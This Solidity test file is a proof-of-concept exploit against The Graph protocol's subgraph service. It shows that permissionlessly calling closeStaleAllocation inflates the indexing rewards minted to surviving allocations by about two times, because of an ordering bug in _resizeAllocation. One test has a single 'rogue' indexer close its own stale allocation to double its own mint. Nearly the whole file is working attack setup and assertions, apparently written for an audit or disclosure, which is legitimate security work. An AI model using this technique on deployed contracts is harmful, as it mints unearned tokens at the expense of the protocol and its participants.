// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.27;

import { IGraphPayments } from "@graphprotocol/interfaces/contracts/horizon/IGraphPayments.sol";
import { IAllocation } from "@graphprotocol/interfaces/contracts/subgraph-service/internal/IAllocation.sol";
import { Allocation } from "subgraph-service/libraries/Allocation.sol";

import { RealRewardsHarness } from "../harness/RealRewardsHarness.t.sol";

/// @title PoC — permissionless closeStaleAllocation inflates survivor indexing rewards (~2x)
/// @notice Root cause: `_resizeAllocation` calls `onSubgraphAllocationUpdate` before subtracting
///         resized tokens from `getSubgraphAllocatedTokens`, inflating `accRewardsPerAllocatedToken`.
///         STALE reclaim clears the stale allocation's pending rewards, but the elevated global
///         index remains for surviving allocations on the same subgraph deployment.
contract IndexingRewardsCloseStaleOverMintPoC is RealRewardsHarness {
    using Allocation for IAllocation.State;
    function test_PoC_CloseStaleAllocation_DoublesSurvivorIndexingMint() public {
        if (!realRmAvailable) {
            vm.skip(true, "RewardsManager artifact missing");
            return;
        }

        uint256 provision = MINIMUM_PROVISION_TOKENS * 10;

        uint256 honestMint = _runScenario(
            _setupIndexer("honest-a", keccak256("honest-subgraph"), provision),
            _setupIndexer("honest-b", keccak256("honest-subgraph"), provision),
            false
        );

        uint256 inflatedMint = _runScenario(
            _setupIndexer("attack-a", keccak256("attack-subgraph"), provision),
            _setupIndexer("attack-b", keccak256("attack-subgraph"), provision),
            true
        );

        emit log_named_uint("honestSurvivorMint", honestMint);
        emit log_named_uint("afterCloseStaleMint", inflatedMint);

        assertGt(honestMint, 0, "sanity: survivor collects rewards");
        assertGe(inflatedMint, (honestMint * 19) / 10, "closeStale inflates survivor mint by ~2x");
    }

    function test_PoC_SingleIndexerTwoAllocs_SelfCloseStale() public {
        if (!realRmAvailable) {
            vm.skip(true, "RewardsManager artifact missing");
            return;
        }

        address rogue = makeAddr("rogue-indexer");
        bytes32 subgraph = keccak256("rogue-subgraph");
        uint256 provision = MINIMUM_PROVISION_TOKENS * 10;

        IndexerSetup memory a = _setupExtraAllocation(rogue, subgraph, provision, "a");
        IndexerSetup memory b = _setupExtraAllocation(rogue, subgraph, provision, "b");

        uint256 honest = _runScenario(a, b, false);

        // fresh subgraph for control
        bytes32 subgraph2 = keccak256("rogue-subgraph-2");
        IndexerSetup memory a2 = _setupExtraAllocation(rogue, subgraph2, provision, "a2");
        IndexerSetup memory b2 = _setupExtraAllocation(rogue, subgraph2, provision, "b2");
        uint256 inflated = _runScenario(a2, b2, true);

        assertGt(honest, 0);
        assertGe(inflated, (honest * 19) / 10);
    }

    function _runScenario(
        IndexerSetup memory staleTarget,
        IndexerSetup memory survivor,
        bool closeStaleFirst
    ) internal returns (uint256 finalMint) {
        vm.roll(block.number + 200);

        _collect(survivor, bytes32("POI-0"));
        skip(7 days);
        vm.roll(block.number + 20);
        _collect(survivor, bytes32("POI-1"));
        skip(7 days);
        vm.roll(block.number + 20);
        _collect(survivor, bytes32("POI-2"));
        skip(15 days);

        assertTrue(subgraphService.getAllocation(staleTarget.allocationId).isStale(MAX_POI_STALENESS));

        if (closeStaleFirst) {
            subgraphService.closeStaleAllocation(staleTarget.allocationId);
            assertEq(subgraphService.getAllocation(staleTarget.allocationId).tokens, 0);
        }

        vm.roll(block.number + 100);
        uint256 before = token.totalSupply();
        _collect(survivor, bytes32("POI-final"));
        finalMint = token.totalSupply() - before;
    }

    function _collect(IndexerSetup memory ix, bytes32 poi) internal {
        bytes memory data = abi.encode(ix.allocationId, poi, _poiMetadata());
        vm.prank(ix.addr);
        subgraphService.collect(ix.addr, IGraphPayments.PaymentTypes.IndexingRewards, data);
    }

    function _setupExtraAllocation(
        address indexer,
        bytes32 subgraph,
        uint256 provision,
        string memory label
    ) internal returns (IndexerSetup memory ix) {
        (string memory url,) = subgraphService.indexers(indexer);
        if (bytes(url).length == 0) {
            _mintTokens(indexer, provision * 2);
            vm.startPrank(indexer);
            token.approve(address(staking), provision * 2);
            staking.stakeTo(indexer, provision * 2);
            staking.provision(indexer, address(subgraphService), provision, FISHERMAN_REWARD_PERCENTAGE, DISPUTE_PERIOD);
            subgraphService.register(indexer, abi.encode("url", "geoHash", address(0)));
            subgraphService.setPaymentsDestination(indexer);
            vm.stopPrank();
        } else {
            _mintTokens(indexer, provision);
            vm.startPrank(indexer);
            token.approve(address(staking), provision);
            staking.stakeTo(indexer, provision);
            staking.addToProvision(indexer, address(subgraphService), provision);
            vm.stopPrank();
        }

        (ix.allocationId, ix.allocationKey) = makeAddrAndKey(string.concat(label, "-alloc"));
        ix.addr = indexer;
        ix.subgraphDeploymentId = subgraph;
        ix.provisionTokens = provision;

        bytes32 digest = subgraphService.encodeAllocationProof(indexer, ix.allocationId);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ix.allocationKey, digest);
        bytes memory allocationData = abi.encode(subgraph, provision, ix.allocationId, abi.encodePacked(r, s, v));
        vm.prank(indexer);
        subgraphService.startService(indexer, allocationData);
    }

    function _poiMetadata() internal view returns (bytes memory) {
        // forge-lint: disable-next-line(unsafe-typecast)
        return abi.encode(block.number, bytes32("PUBLIC_POI"), uint8(0), uint8(0), uint256(0));
    }
}
